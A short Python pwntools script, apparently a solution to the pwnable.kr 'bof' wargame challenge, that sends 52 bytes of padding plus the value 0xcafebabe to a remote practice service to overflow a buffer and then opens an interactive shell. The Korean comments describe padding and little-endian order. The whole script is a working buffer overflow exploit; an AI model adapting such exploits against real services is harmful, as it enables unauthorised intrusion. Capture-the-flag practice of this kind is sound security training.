from pwn import *

p = remote("pwnable.kr", 9000)

# 패딩 추가
code ='A'*52
code+="\xbe\xba\xfe\xca";
# buf_address를 리틀 엔디안 형식으로 추가
print(code)
p.sendline(code)
p.interactive()
